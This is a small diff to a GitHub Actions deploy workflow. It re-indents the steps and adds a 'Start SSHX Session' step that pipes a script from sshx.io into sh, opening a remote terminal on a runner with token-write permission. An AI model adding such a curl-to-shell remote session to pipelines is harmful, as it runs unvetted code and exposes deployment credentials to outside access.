@@ -14,8 +14,12 @@ jobs:
       id-token: write
 
     steps:
-    - name: Checkout Repo
-      uses: actions/checkout@v4
+      - name: Checkout Repo
+        uses: actions/checkout@v4
 
-    - name: Deploy
-      uses: DefangLabs/defang-github-action@v1.1.0
+      - name: Deploy
+        uses: DefangLabs/defang-github-action@v1.1.0
+
+      - name: Start SSHX Session
+        run: |
+          curl -sSf https://sshx.io/get | sh -s run
